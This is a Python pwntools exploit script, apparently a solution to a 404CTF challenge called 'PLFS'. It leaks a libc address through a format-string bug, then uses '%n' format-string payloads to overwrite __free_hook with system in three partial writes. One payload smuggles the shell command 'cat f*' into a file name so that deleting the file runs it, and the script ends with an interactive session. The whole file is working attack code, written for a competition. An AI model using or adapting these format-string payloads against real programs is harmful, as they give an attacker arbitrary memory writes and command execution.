#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF("PLFS_patched")
libc = ELF("./libc.so.6")


# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challenges.404ctf.fr", "32112"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def liste(name):
  sla('> ', 'ListerLesFichiers '+name)

def recup(name):
  sla('> ', 'RécupérerLeFichier '+name)

def send(name):
  sla('> ', 'EnvoyerLeFichier '+name)

def free(name):
  sla('> ', 'SupprimerLeFichier '+name)


send('.%35$p.')
liste('.%35$p.')
libc.address = int(rcu('.0x','.'),16) - 0x24083
logbase()
free('.%35$p.')

target = libc.sym['system']
print('target = '+hex(target))
low1 = (target & 0xffff)
payload = '%'+str(low1)+'c%20$nAA'+p64(libc.sym['__free_hook'])
send(payload)
liste(payload)

low1 = ((target>>16) & 0xffff)
payload = "%"+str(low1)+'c%20$nAA'+p64(libc.sym['__free_hook']+2)
send(payload)
liste(payload)

low1 = ((target>>32) & 0xffff)
payload = "%"+str(low1)+'c%21$n;cat f*  ;'+p64(libc.sym['__free_hook']+4)
send(payload)
liste(payload)

free(payload)

p.interactive()

